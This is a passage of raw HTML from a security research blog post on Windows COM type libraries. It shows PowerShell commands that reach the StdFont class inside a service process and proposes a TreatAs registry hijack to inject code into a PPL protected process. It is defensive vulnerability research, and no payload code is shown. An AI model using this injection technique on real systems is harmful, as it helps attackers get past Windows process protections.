 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The script creates the COM object and then uses the&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Import-ComTypeLib&lt;/span&gt;&lt;span&gt;&amp;nbsp;command to get the type library interface. We can check that the type library interface is really running out of process by marshaling it with &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Get-ComObjRef&lt;/span&gt;&lt;span&gt;&amp;nbsp;then extracting the process information, showing it running in an instance of &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;svchost.exe&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is the shared service executable. Inspecting the type library through the interface is painful, to make it easier to display what classes are supported, we can parse the library into an easier to use object model with the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Parse&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;method. We can then dump information about the library, including a list of its classes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;Unfortunately for this COM object the only classes the type library supports are already registered to run in the service and so we&amp;#39;ve gained nothing. What we need is a class that is only registered to run in the local process, but is exposed by the type library. This is a possibility as a type library could be shared by both local in-process components and an out-of-process service. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;I inspected the other 4 COM classes (one of which is incorrectly registered and isn&amp;#39;t exposed by the corresponding service) and found no useful classes to try and exploit. You might decide to give up at this point, but it turns out there are some classes accessible, they&amp;#39;re just hidden. This is because a type library can reference other type libraries, which can be inspected using the same set of interfaces. Let&amp;#39;s take a look:&lt;/span&gt;&lt;/p&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $parsed.ReferencedTypeLibs&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;TypeLibId&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-------&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;stdole&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;2.0&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;00020430-0000-0000-c000-000000000046&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $parsed.ReferencedTypeLibs[0].Parse().Classes | Select Name, Uuid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; Uuid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; ----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;StdFont &amp;nbsp; &amp;nbsp;0be35203-8f91-11ce-9de3-00aa004bb851&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;StdPicture 0be35204-8f91-11ce-9de3-00aa004bb851&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls = Get-ComClass -Clsid 0be35203-8f91-11ce-9de3-00aa004bb851&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls.Servers&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Key Value&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--- -----&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5 ROKGfcMygP-c9&quot;&gt;InProcServer32 C:\Windows\System32\oleaut32.dll&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;In the example we can use the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;ReferencedTypeLibs&lt;/span&gt;&lt;span&gt;&amp;nbsp;property to show what type libraries were encountered when the library was parsed. We can see a single entry for the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;stdole&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is basically always going to be imported. If you&amp;#39;re lucky, maybe there&amp;#39;s other libraries that are imported that you can inspect. We can parse the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;stdole&lt;/span&gt;&lt;span&gt;&amp;nbsp;library to inspect its list of classes. There&amp;#39;s two classes that are exported by the type library, if we inspect the servers for &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can see that it is only specified to be creatable in process, we now have a target class to look for bugs. To get an out of process interface for the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;stdole&lt;/span&gt;&lt;span&gt;&amp;nbsp;type library we need to find a type which references it. The reason for the reference is that common interfaces such as &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IUnknown&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;IDispatch&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;are defined in the library, so we need to query the base type of an interface we can directly access. &amp;nbsp;Let&amp;#39;s try to create the object in the COM service.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $iid = $parsed.Interfaces[0].Uuid&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $ti = $lib.GetTypeInfoOfGuid($iid)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $href = $ti.GetRefTypeOfImplType(0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $base = $ti.GetRefTypeInfo($href)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $stdole = $base.GetContainingTypeLib()&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $stdole.Parse()&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name &amp;nbsp; Version TypeLibId&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---- &amp;nbsp; ------- ---------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;stdole 2.0 &amp;nbsp; &amp;nbsp; 00020430-0000-0000-c000-000000000046&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $ti = $stdole.GetTypeInfoOfGuid(&amp;quot;0be35203-8f91-11ce-9de3-00aa004bb851&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $font = $ti.CreateInstance()&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; Get-ComObjRef&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$font | Select ProcessId, ProcessName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;ProcessId ProcessName&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;--------- -----------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&amp;nbsp; &amp;nbsp; 27020 svchost.exe&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; &amp;nbsp;Get-ComInterface -Object $Obj&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; IID &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;HasProxy &amp;nbsp; HasTypeLib&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;-------- &amp;nbsp; ----------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;IFont &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;bef6e002-a874-101a-8bba-00aa00300cab True &amp;nbsp; &amp;nbsp; &amp;nbsp; False&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c9 ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;IFontDisp &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;bef6e003-a874-101a-8bba-00aa00300cab True &amp;nbsp; &amp;nbsp; &amp;nbsp; True&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;We query the base type of an existing interface through a combination of &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-itypeinfo-getreftypeofimpltype&quot;&gt;GetRefTypeOfImplType&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/oaidl/nf-oaidl-itypeinfo-getreftypeinfo&quot;&gt;GetRefTypeInfo&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, then use &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;GetContainingTypeLib&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get the referenced type library interface. We can parse the library to be confident that we&amp;#39;ve got the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;stdole&lt;/span&gt;&lt;span&gt;&amp;nbsp;library. Next we get the type info for the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;class and call &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CreateInstance&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;. We can inspect the object&amp;#39;s process to ensure it was created out of process, the results shows its trapped in the service process. As a final check we can query for the object&amp;#39;s interfaces to prove that it&amp;#39;s a font object.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Now we just need to find a way of exploiting one of these two classes, the first problem is only the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;object can be accessed. The &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdPicture&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;object does a check to prevent it being used out of process. I couldn&amp;#39;t find useful exploitable behavior in the font object, but I didn&amp;#39;t spend too much time looking. Of course, if anyone else wants to look for a suitable bug in the class then go ahead.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;This research was therefore at a dead end, at least as far as system services go. There might be some COM server accessible from a sandbox but an initial analysis of ones accessible from AppContainer didn&amp;#39;t show any obvious candidates. However, after thinking a bit more about this I realized it could be useful as an injection technique into a process running at the same privilege level. For example, we could hijack the COM registration for &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;, to point to any other class using the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/com/treatas&quot;&gt;TreatAs&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;registry key. This other class would be something exploitable, such as loading the JScript engine into the target process and running a script. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Still, injection techniques are not something I&amp;#39;d usually discuss on this blog, that&amp;#39;s more in the realm of malware. However, there is a scenario where it might have interesting security implications. What if we could use this to inject into a Windows Protected Process? In a strange twist of fate, the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;WaaSRemediationAgent&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;class we&amp;#39;ve just been inspecting might just be our ticket to ride:&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt; $cls&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;Get-ComClass&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;-Clsid&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;72566e27-1abb-4eb3-b4f0-eb431cb1cb32&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;PS&amp;gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;$cls.AppIDEntry.ServiceProtectionLevel&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c5&quot;&gt;WindowsLight&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;When we inspect the protection level for the hosting service it&amp;#39;s configured to run at the PPL-Windows level! Let&amp;#39;s see if we can salvage some value out of this research.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ROKGfcMygP-c11&quot; id=&quot;h.3v9u0s1gnv0c&quot;&gt;&lt;span&gt;Protected Process Injection&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;I&amp;#39;ve &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html&quot;&gt;blogged&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;(and presented) on the topic of injecting into Windows Protected Processes before. I&amp;#39;d recommend re-reading that blog post to get a better background of previous injection attacks. However, one key point is that Microsoft does not consider PPL a security boundary and so they won&amp;#39;t generally fix any bugs in a security bulletin in a timely manner, but they might choose to fix it in a new version of Windows.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The idea is simple, we&amp;#39;ll redirect the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;class registration to point to another class so that when we create it via the type library it&amp;#39;ll be running the protected process. Choosing to use &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;should be more generic as we could move to using a different COM server if &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;WaaSRemediationAgent&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;is removed. We just need a suitable class which gets us arbitrary code execution which also works in a protected process. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Unfortunately this immediately rules out any of the scripting engines like JScript. If you&amp;#39;ve re-read my last blog post, the Code Integrity module explicitly blocks the common script engines from loading in a protected process. Instead, I need a class which is accessible out of process and can be loaded into a protected process. I realized one option is to load a registered &lt;/span&gt;&lt;span&gt;.NET&lt;/span&gt;&lt;span&gt;&amp;nbsp;COM class. I&amp;#39;ve &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html&quot;&gt;blogged&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;about how .NET DCOM is exploitable, and shouldn&amp;#39;t be used, but in this case we &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;want&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;the buggyness. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
